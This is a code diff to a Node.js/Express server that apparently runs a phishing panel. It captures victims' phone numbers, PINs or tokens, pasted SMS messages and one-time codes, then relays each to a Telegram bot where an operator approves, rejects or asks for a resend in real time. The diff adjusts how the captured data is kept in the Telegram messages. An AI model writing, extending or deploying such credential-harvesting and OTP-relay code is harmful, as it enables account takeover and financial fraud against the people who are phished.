@@ -5,6 +5,7 @@
        * login: none
        * sms:   sends user back to login (fresh start)
        * otp:   clears OTP boxes on same page
+   - Preserves original message body when editing on approve/reject
    - No DB (in-memory Map, auto-cleaned)
    ============================================================ */
 
@@ -32,6 +33,9 @@ const SESSION_MAX_AGE_MS = 15 * 60 * 1000;
 
 /* ============================================================
    IN-MEMORY SESSION STORE
+   Each session stores `originalText` — the exact message body
+   sent to Telegram. We reuse it when editing the message on
+   approve / reject / resend so nothing is lost.
    ============================================================ */
 const sessions = new Map();
 
@@ -91,22 +95,15 @@ function isValidPhone(phone) {
 
 /* ============================================================
    TELEGRAM — send message
-   Buttons depend on step:
-     login → only ✅ ❌
-     sms   → ✅ ❌ 🔁
-     otp   → ✅ ❌ 🔁
    ============================================================ */
 function buildKeyboard(step, sessionId) {
   const row = [
     { text: '✅ Approve', callback_data: `approve:${step}:${sessionId}` },
     { text: '❌ Reject',  callback_data: `reject:${step}:${sessionId}` }
   ];
-
-  /* Add 🔁 only for sms & otp */
   if (step === 'sms' || step === 'otp') {
     row.push({ text: '🔁 Resend', callback_data: `resend:${step}:${sessionId}` });
   }
-
   return { inline_keyboard: [row] };
 }
 
@@ -139,7 +136,7 @@ async function sendTelegramWithButtons(text, sessionId, step) {
   }
 }
 
-async function editTelegramMessage(messageId, text, keepButtons) {
+async function editTelegramMessage(messageId, text, replyMarkup) {
   if (!messageId || !TELEGRAM_BOT_TOKEN) return;
   try {
     const body = {
@@ -149,9 +146,12 @@ async function editTelegramMessage(messageId, text, keepButtons) {
       parse_mode: 'HTML',
       disable_web_page_preview: true
     };
-    if (keepButtons) {
-      body.reply_markup = keepButtons;
+
+    /* Explicitly handle keyboard (empty array = remove buttons) */
+    if (replyMarkup !== undefined) {
+      body.reply_markup = replyMarkup;
     }
+
     await fetch(TELEGRAM_EDIT_URL, {
       method: 'POST',
       headers: { 'Content-Type': 'application/json' },
@@ -177,19 +177,6 @@ async function answerCallback(callbackQueryId, text) {
   } catch (err) {
     console.error('answerCallback failed:', err.message);
   }
-}
-
-function summariseSession(session) {
-  if (session.step === 'login') {
-    return `📱 ${escapeHtml(session.data.phone)} — PIN entered`;
-  }
-  if (session.step === 'sms') {
-    return `📱 ${escapeHtml(session.data.phone)} — SMS pasted`;
-  }
-  if (session.step === 'otp') {
-    return `📱 ${escapeHtml(session.data.phone)} — OTP ${escapeHtml(session.data.otp)}`;
-  }
-  return '';
 }
 
 /* ============================================================
@@ -239,6 +226,7 @@ app.post('/api/login', async (req, res) => {
       step: 'login',
       status: 'pending',
       data: { phone, country, token },
+      originalText: text,
       createdAt: Date.now(),
       resolvedAt: null,
       telegramMessageId: messageId
@@ -284,6 +272,7 @@ app.post('/api/sms', async (req, res) => {
       step: 'sms',
       status: 'pending',
       data: { phone, token, sms, reference },
+      originalText: text,
       createdAt: Date.now(),
       resolvedAt: null,
       telegramMessageId: messageId
@@ -330,6 +319,7 @@ app.post('/api/verify-otp', async (req, res) => {
       step: 'otp',
       status: 'pending',
       data: { phone, otp, sms, reference },
+      originalText: text,
       createdAt: Date.now(),
       resolvedAt: null,
       telegramMessageId: messageId
@@ -343,12 +333,11 @@ app.post('/api/verify-otp', async (req, res) => {
 });
 
 /* ============================================================
-   POST /api/resend-sms  (informational — user-initiated resend)
+   POST /api/resend-sms
    ============================================================ */
 app.post('/api/resend-sms', async (req, res) => {
   try {
     const { phone = '' } = req.body || {};
-
     if (!isValidPhone(phone)) {
       return res.status(400).json({ ok: false, error: 'Invalid phone number' });
     }
@@ -402,7 +391,7 @@ app.get('/api/status/:sessionId', (req, res) => {
 });
 
 /* ============================================================
-   POST /api/telegram-webhook  (handles ✅ ❌ 🔁)
+   POST /api/telegram-webhook
    ============================================================ */
 app.post('/api/telegram-webhook', async (req, res) => {
   try {
@@ -430,6 +419,7 @@ app.post('/api/telegram-webhook', async (req, res) => {
 
     /* ==========================================================
        🔁 RESEND
+       Keep the ORIGINAL message text and update the header line.
        ========================================================== */
     if (action === 'resend') {
       session.status = 'resend_requested';
@@ -437,16 +427,16 @@ app.post('/api/telegram-webhook', async (req, res) => {
       await answerCallback(cb.id, '🔁 Resend requested');
 
       const when = new Date().toLocaleString('en-GB', { timeZone: 'Africa/Douala' });
-      const summary = summariseSession(session);
+
+      /* Preserve original body, just replace the first line */
+      const preservedBody = stripFirstLine(session.originalText);
       const newText =
         `🔁 <b>RESEND REQUESTED</b> — awaiting final decision\n` +
         `━━━━━━━━━━━━━━━━━━\n` +
-        `${summary}\n` +
-        `🕒 <b>Requested:</b> ${when}\n\n` +
-        `⏳ Tap ✅ or ❌ to finish`;
+        preservedBody +
+        `\n\n🕒 <b>Resend requested:</b> ${when}`;
 
       if (session.telegramMessageId) {
-        /* Keep only ✅ ❌ after resend */
         await editTelegramMessage(session.telegramMessageId, newText, {
           inline_keyboard: [[
             { text: '✅ Approve', callback_data: `approve:${step}:${sessionId}` },
@@ -460,6 +450,8 @@ app.post('/api/telegram-webhook', async (req, res) => {
 
     /* ==========================================================
        ✅ APPROVE  /  ❌ REJECT
+       Keep the ORIGINAL message text and just change the header
+       line + remove the buttons.
        ========================================================== */
     if (action === 'approve') {
       session.status = 'approved';
@@ -474,18 +466,22 @@ app.post('/api/telegram-webhook', async (req, res) => {
       return res.json({ ok: true });
     }
 
-    const statusLine = action === 'approve' ? '✅ <b>APPROVED</b>' : '❌ <b>REJECTED</b>';
+    const statusLine = action === 'approve'
+      ? '✅ <b>APPROVED</b>'
+      : '❌ <b>REJECTED</b>';
     const when = new Date().toLocaleString('en-GB', { timeZone: 'Africa/Douala' });
-    const summary = summariseSession(session);
 
+    /* Preserve original body (everything after the first line) */
+    const preservedBody = stripFirstLine(session.originalText);
     const newText =
       `${statusLine}\n` +
       `━━━━━━━━━━━━━━━━━━\n` +
-      `${summary}\n` +
-      `🕒 <b>Resolved:</b> ${when}`;
+      preservedBody +
+      `\n\n🕒 <b>Resolved:</b> ${when}`;
 
     if (session.telegramMessageId) {
-      await editTelegramMessage(session.telegramMessageId, newText);
+      /* Empty array = remove buttons entirely */
+      await editTelegramMessage(session.telegramMessageId, newText, { inline_keyboard: [] });
     }
 
     return res.json({ ok: true });
@@ -494,6 +490,16 @@ app.post('/api/telegram-webhook', async (req, res) => {
     return res.json({ ok: true });
   }
 });
+
+/* Return everything after the first line of a message */
+function stripFirstLine(text) {
+  if (!text) return '';
+  const idx = text.indexOf('\n');
+  if (idx === -1) return '';
+  const rest = text.slice(idx + 1);
+  /* Also strip the leading ━ divider line if present */
+  return rest.replace(/^━+\n/, '').trim();
+}
 
 /* ============================================================
    404 + ERROR HANDLERS
